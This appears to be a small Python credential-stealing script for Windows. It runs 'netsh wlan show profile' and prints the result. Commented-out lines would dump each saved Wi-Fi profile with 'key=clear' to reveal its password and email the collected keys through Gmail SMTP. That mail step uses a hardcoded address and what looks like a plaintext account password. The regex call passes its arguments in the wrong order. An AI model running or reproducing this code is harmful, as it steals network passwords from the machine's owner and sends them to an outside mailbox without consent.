import subprocess
import smtplib
import re

def send_mail(email, password, messages):
  server = smtplib.SMTP("smtp.gmail.com", 587)
  server.starttls()
  server.login(email, password)
  server.sendmail(email, email, messages)
  server.quit()
  
  
command = "netsh wlan show profile"
output = subprocess.check_output(command, shell=True)
# filter_result = re.findall(output, "(All\sUser\sProfile\s*:\s)(.*)")
print(output)

# mail_output = ""
# for results in filter_result:
#   command = "netsh wlan show profile " + "\"" + results + "\"" + " key=clear"
#   current_result = subprocess.check_output(command, shell=True)
#   mail_output = mail_output + current_result
#
# print(mail_output)
# send_mail("kavinprasadj@gmail.com", "Kavinprasad333",mail_output)




